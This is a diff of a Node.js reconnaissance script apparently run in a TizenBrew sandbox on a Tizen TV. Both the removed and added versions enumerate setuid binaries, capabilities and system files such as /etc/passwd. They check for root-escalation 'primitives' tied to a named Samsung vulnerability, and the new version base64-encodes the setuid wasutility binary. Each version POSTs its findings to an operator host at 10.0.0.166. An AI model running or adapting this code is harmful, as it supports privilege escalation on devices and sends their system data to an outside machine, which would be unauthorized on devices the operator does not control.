@@ -1,40 +1,18 @@
-// Read-only live-system recon. Runs in the TizenBrew service sandbox (Node 4.x).
-// Posts findings back to the operator PC. No writes to the TV.
+// Stage-2 read-only recon: pull the setuid wasutility binary + check capability binaries.
 var fs = require('fs');
 var http = require('http');
 var cp = require('child_process');
-function read(p) { try { return fs.readFileSync(p, 'utf8'); } catch (e) { return 'ERR ' + e.message; } }
-function exec(c) { try { return cp.execSync(c, { timeout: 5000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
-var SUID = parseInt('4000', 8), SGID = parseInt('2000', 8);
+function ex(c) { try { return cp.execSync(c, { timeout: 8000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
+function st(p) { try { var s = fs.statSync(p); return { uid: s.uid, gid: s.gid, mode: s.mode.toString(8), size: s.size }; } catch (e) { return null; } }
+function b64(p) { try { return fs.readFileSync(p).toString('base64'); } catch (e) { return 'ERR ' + e.message; } }
 var out = {};
-out.kernel = read('/proc/version');
-out.passwd = read('/etc/passwd');
-out.osrelease = read('/etc/os-release');
-out.mounts = read('/proc/mounts');
-out.uname = exec('uname -a');
-out.id = exec('id');
-var dirs = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin'];
-var suid = [], bins = {};
-dirs.forEach(function (d) {
-  var list; try { list = fs.readdirSync(d); } catch (e) { return; }
-  bins[d] = list.length;
-  list.forEach(function (f) {
-    var p = d + '/' + f;
-    try { var st = fs.statSync(p); if ((st.mode & SUID) || (st.mode & SGID)) suid.push(p + ' mode=' + st.mode.toString(8)); } catch (e) { }
-  });
-});
-out.setuid = suid;
-out.binCounts = bins;
-out.hasSu = exec('which su sudo');
-// Root-chain primitives (chris-ritsen / SVE-2025-50109 style)
-out.primitives = {};
-['/usr/bin/dotnet', '/usr/sbin/sdbd-tarlauncher', '/usr/bin/su', '/usr/sbin/sdbd', '/usr/bin/app_launcher', '/usr/bin/wrt-launcher'].forEach(function (p) {
-  try { var st = fs.statSync(p); out.primitives[p] = 'mode=' + st.mode.toString(8); } catch (e) { out.primitives[p] = 'ABSENT'; }
-});
-out.caps = read('/proc/self/status').split('\n').filter(function (l) { return l.indexOf('Cap') === 0; }).join('; ');
-out.getcap = exec('getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null');
-out.usrSbin = (function () { try { return fs.readdirSync('/usr/sbin').join(','); } catch (e) { return 'ERR'; } })();
+out.wasutility = st('/usr/bin/wasutility');
+out.dotnet = st('/usr/bin/dotnet');
+out.tarlauncher = st('/usr/sbin/sdbd-tarlauncher');
+out.getcap = ex('getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null');
+out.sbin = ex('ls /usr/sbin');
+out.wasutility_b64 = b64('/usr/bin/wasutility');
 var body = JSON.stringify(out);
-var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, function (res) { });
+var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon2', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, function (r) { });
 req.on('error', function (e) { });
 req.write(body); req.end();
